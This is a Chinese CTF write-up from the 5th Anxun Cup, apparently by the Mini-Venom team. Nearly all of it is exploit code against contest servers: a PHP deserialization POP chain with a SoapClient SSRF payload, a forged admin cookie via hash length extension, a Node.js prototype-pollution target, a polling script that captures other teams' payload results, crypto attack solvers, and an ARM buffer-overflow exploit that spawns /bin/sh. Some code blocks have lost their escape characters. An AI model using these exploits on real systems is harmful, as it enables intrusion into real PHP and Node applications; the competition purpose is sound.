# 第五届安洵杯 WriteUp by Mini-Venom（招新）

> 原文: https://www.ctfiot.com/81074.html
> ID: 81074

招新小广告
CTF组诚招re、crypto、pwn、misc、合约方向的师傅,长期招新
IOT+Car+工控+样本分析多个组招人
有意向的师傅请联系邮箱admin@chamd5.org(带上简历和想加入的小组)

index.php的反序列化链很好找，调用栈大概是这样子：

将反序列化的值保存到sess文件里：

使用原本的pop链触发session反序列化

下面是全部的代码

后面改成了公用环境就去写了个监控脚本，因为一般做的原型链污染的题是第一次构造payload访问进行污染，第二次才是执行。就写了个监控内容的脚本挂着了，分别监控了/,/infoflllllag,/Cookie 。不知道题目错误还是上车了：在/infoflllllag页面弄到了flag

监控脚本生成的文件1.txt发群里了，cat 1.txt | grep “D0g3″| more的执行结果：


```
// index.php
<?php
//something in flag.php

class A
{
    public $a;
    public $b;

    public function __wakeup()
    {
        $this->a = "babyhacker";
    }

    public function __invoke()
    {
        if (isset($this->a) && $this->a == md5($this->a)) {
            $this->b->uwant();
        }
    }
}

class B
{
    public $a;
    public $b;
    public $k;

    function __destruct()
    {
        $this->b = $this->k;
        die($this->a);
    }
}

class C
{
    public $a;
    public $c;

    public function __toString()
    {
        $cc = $this->c;
        return $cc();
    }
    public function uwant()
    {
        if ($this->a == "phpinfo") {
            phpinfo();
        } else {
            $tmp = array(reset($_SESSION), $this->a);
            call_user_func($tmp);
        }
    }
}

if (isset($_GET['d0g3'])) {
    ini_set($_GET['baby'], $_GET['d0g3']);
    session_start();
    $_SESSION['sess'] = $_POST['sess'];
}
else{
    session_start();
    if (isset($_POST["pop"])) {
        unserialize($_POST["pop"]);
    }
}
var_dump($_SESSION);
highlight_file(__FILE__);

//flag.php
<?php
session_start();
highlight_file(__FILE__);
//flag在根目录下
if($_SERVER["REMOTE_ADDR"]==="63127.0.0.1"){
    $f1ag=implode(array(new $_GET['a']($_GET['b'])));
    $_SESSION["F1AG"]= $f1ag;
}else{
    echo "only localhost!!";
}
```



```
if (isset($this->a) && $this->a == md5($this->a))
```



```
$ser_str = str_replace('O:1:"A":2', 'O:1:"A":3', $ser_str);
```



```
if (isset($_GET['d0g3'])) {
    ini_set($_GET['baby'], $_GET['d0g3']);
    session_start();
    $_SESSION['sess'] = $_POST['sess'];
}
```



```
<?php
$target='http://127.0.0.1/flag.php?a=SplFileObject&b=/f1111llllllaagg';
$b = new SoapClient(null,array('location' => $target,
    'user_agent' => "crypt0nrnCookie:PHPSESSID=flag2333rn",
    'uri' => "http://127.0.0.1/"));
$a = serialize($b);
echo "|".urlencode($a);
```



```
//exp.php
<?php
class A
{
    public $a;
    public $b;
    function __construct(){
        $this->a = "0e215962017";
        $this->b = new C(1);
    }

}
class B
{
    public $a;
    public $b;
    public $k;
    function __construct(){
        $this->a=new C(new A());
    }
}
class C
{
    public $a;
    public $c;
    function __construct($class){
        $this->a = "SoapClient";
        $this->c = $class;
    }
}
$exp = new B();
$ser_str = serialize($exp);
$ser_str = str_replace('O:1:"A":2', 'O:1:"A":3', $ser_str);
echo $ser_str;

// ssrf.php
<?php
$target='http://127.0.0.1/flag.php?a=SplFileObject&b=/f1111llllllaagg';
$b = new SoapClient(null,array('location' => $target,
    'user_agent' => "crypt0nrnCookie:PHPSESSID=flag2333rn",
    'uri' => "http://127.0.0.1/"));
$a = serialize($b);
echo "|".urlencode($a);
```



```
<!--This secret is 7 characters long for security!
hash=md5(secret+"flag");//1946714cfa9deb70cc40bab32872f98a
admin cookie is   md5(secret+urldecode("flag%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00X%00%00%00%00%00%00%00dog"));
-->
```



```
POST /index HTTP/1.1
Host: 47.108.29.107:23333
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6; rv:123.0) Gecko/20100101 Firefox/123.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/jxl,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 20
Origin: http://47.108.29.107:23333
Connection: close
Referer: http://47.108.29.107:23333/
Cookie: hash=ed63246fb602056fee4a7ec886d0a3c2
Upgrade-Insecure-Requests: 1

pwd=123&userid=Admin
```



```
var express = require('express');
var router = express.Router();
const isObject = obj = >obj && obj.constructor && obj.constructor === Object;
const merge = (a, b) = >{
    for (var attr in b) {
        if (isObject(a[attr]) && isObject(b[attr])) {
            merge(a[attr], b[attr]);
        } else {
            a[attr] = b[attr];
        }
    }
    return a
}

const clone = (a) = >{
    return merge({},
    a);
}
router.get('/',
function(req, res, next) {
    if (req.flag == "flag") {
        flag;
        res.send('flag?????????????');
    }
    res.render('info');
});
router.post('/', express.json(),
function(req, res) {
    var str = req.body.id;
    var obj = JSON.parse(str);
    req.cookies.id = clone(obj);
    res.render('info');
});
module.exports = router;
```



```
import requests
url1 = "http://47.108.29.107:23333/infoflllllag"
url2 = "http://47.108.29.107:23333/Cookie"
url3 = "http://47.108.29.107:23333/"
with open("/1.txt", "a") as file:
   while True:
      talk  = requests.get(url1)
      talk2 = requests.get(url2)
      talk3 = requests.get(url3)
      file.write(str(talk.text) + "n")
      file.write(str(talk2.text) + "n")
      file.write(str(talk3.text) + "n")
```



```
def hex_payload(payload):
     res_payload = ''
     for i in payload:
        i = "\x" + hex(ord(i))[2:]
        res_payload += i
     print("[+]'{}' Convert to hex: "{}"".format(payload,res_payload))
if __name__ == "__main__":
    payload = input("Input payload: ")
    hex_payload(payload)
```



```
package main
import (
   "crypto/sha256"
   "fmt"
   "time"
)
var (
   chars  = "ABCDEFGHIJKLMNOPQRSTUVWXYZ" + "abcdefghijklmnopqrstuvwxyz" + "0123456789" // A-Z a-z 0-9
   tail   = "fuWhjDPmS79bNGOS"                                                         // 原字符串的尾部
   result = "e9015208236cb20c50d1d04fe11c9cf55dd8365d9410194c283c5100e3bf82d8"         // hash值
)
func sha(head string) {
   h := sha256.New()
   h.Write([]byte(head + tail))
   str := fmt.Sprintf("%x", h.Sum(nil))
   if str == result {
      fmt.Println(head)
   }
}
func main() {
   start := time.Now()
   for _, ch1 := range chars {
      for _, ch2 := range chars {
         for _, ch3 := range chars {
            for _, ch4 := range chars {
               sha(string(ch1) + string(ch2) + string(ch3) + string(ch4))
            }
         }
      }
   }
   end := time.Since(start)
   fmt.Println(end)
}
```



```
from pwn import *
from hashlib import sha256
import string
from itertools import product
context.log_level = "info"

ip = "120.78.131.38"
port = 10086

io = remote(ip,port)

def PoW():
    io.recvuntil(b"SHA256(XXXX + ")
    suffix = io.recv(16).decode()
    io.recvuntil(b"):")
    target = io.recv(64).decode()
    print(suffix)
    print(target)
    io.recvline()
    letters = string.ascii_letters + string.digits
    for i in product(letters,repeat=4):
        prefix = ''.join(i)
        if sha256((prefix+suffix).encode()).hexdigest() == target:
            io.sendafter(b"Give Me XXXX:n",prefix.encode())
            break
def encrypt(data):
    io.sendafter(b"You can input anything:n",data.encode())
    io.recvuntil(b"Here is your cipher: b'")
    cipher = io.recvline()[:-2].decode().strip()
    return cipher

PoW()
cipher = bytes.fromhex(encrypt("_"))

flag2 = ""
chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789}"
for i in range(16):
    for char in chars:
        payload = "0"*8+"0"*(15-i)+"".join(flag2)
        payload = payload+char+"0"*(15-i)
        c = encrypt(payload)
        p1,p2 = c[32:64],c[64:96]
        if p1 == p2:
            flag2 += char
            break
    print(flag2)
from Crypto.Cipher import AES
# key = flag2
key = "IDl8FuWPu01RHZt}"
def decrypt(key, message):
    aes = AES.new(key, AES.MODE_ECB)
    return aes.decrypt(message)
flag = decrypt(key.encode(),cipher)
print(flag.replace(b"_",b""))
io.close()
# D0g3{o7sIDl8FuWPu01RHZt}
```



```
from pwn import *
from hashlib import sha256
import string
from itertools import product
context.log_level = "DEBUG"

ip = "120.78.131.38"
port = 10010

io = remote(ip,port)

def PoW():
    io.recvuntil(b"SHA256(XXXX + ")
    suffix = io.recv(16).decode()
    io.recvuntil(b"):")
    target = io.recv(64).decode()
    print(suffix)
    print(target)
    io.recvline()
    letters = string.ascii_letters + string.digits
    for i in product(letters,repeat=4):
        prefix = ''.join(i)
        if sha256((prefix+suffix).encode()).hexdigest() == target:
            io.sendafter(b"Give Me XXXX:n",prefix.encode())
            break
def PoW2():
    io.recvuntil("You must prove your identity to enter the palace ")
    auth = io.recvline().decode().strip()
    mid = xor(bytes.fromhex(auth),b"Whitfield__Diffi")
    payload = b"Whitfield__Diffiex0fx0fx0fx0fx0fx0fx0fx0fx0fx0fx0fx0fx0fx0fx0f"+mid+b"e"
    io.sendafter(b"--> ",payload)
    
PoW()
PoW2()
io.recvuntil(b"Flag has been encrypted by Diffien")
n, e1, e2, e3, c1, c2, c3 = eval(io.recvall().decode().strip())

from Crypto.Util.number import *

def egcd(a, b):
    if a == 0:
        return (b, 0, 1)
    else:
        g, y, x = egcd(b % a, a)
        return (g, x - (b // a) * y, y)

def attack(e1,e2,e3,c1,c2,c3,n):
    E0,a,b = egcd(e1,e2)
    if a<0:
        a = - a
        c1 =  inverse(c1, n)
    elif b<0:
        b = - b
        c2 = inverse(c2, n)
    cc1=(pow(c1,a,n)*pow(c2,b,n)) % n

    E1,a,b = egcd(e1,e3)

    if a<0:
        a = - a
        c1 =  inverse(c1, n)
    elif b<0:
        b = - b
        c3 = inverse(c3, n)
    cc2=(pow(c1,a,n)*pow(c3,b,n)) % n
    _,a,b = egcd(E0,E1)

    if a<0:
        a = - a
        cc1 =  inverse(cc1, n)
    elif b<0:
        b = - b
        cc2 = inverse(cc2, n)
    m=(pow(cc1,a,n)*pow(cc2,b,n)) % n
    print(long_to_bytes(m))

# 多试几次 attack(e1,e2,e3,c1,c2,c3,n)

io.close()

# D0g3{New_3ra_@f_PK_Crypt0graphy_1976}
```



```
from pwn import *
r=remote('47.108.29.107',10059)
payload=b's1mpl3Dec0d4r'
r.sendlineafter('msg>',payload)
print(r.recv())
print(r.recv())
#在这加返回地址,构造rop
payload=b''
r.sendlineafter('comment> ',payload)
 因为是qemu启动的赛题不是真机，即使题目所给的二进制文件开了NX和PIE保护，也只是对真机环境奏效，而在qemu中跑的时候，仍然相当于没有这些保护
最终EXP：
from pwn import *
context.binary = "./chall"
#r=process(["qemu-arm", "-g", "8888", "./chall"])
r=remote("47.108.29.107",10059)
elf=ELF('./chall')
payload='s1mpl3Dec0d4r'
r.sendlineafter('msg>',payload)
payload = 'a'*0x28 + p32(elf.bss() + 0x2c) + p32(0x10C00)
r.sendlineafter('comment>',payload)
 
shellcode = asm('''
    add r0, pc, #12
    mov r1, #0
    mov r2, #0
    mov r7, #11
    svc 0
    .ascii "/bin/sh\0"
''')

payload =shellcode.ljust(0x2c, b'x00') + p32(elf.bss())
print(payload)
r.send(payload)
r.interactive()
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/7-1669601512.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/8-1669601514.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/1-1669601514.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/6-1669601517.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/2-1669601519.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/6-1669601521.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/2-1669601522.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/3-1669601523.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/4-1669601525.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/6-1669601525.png)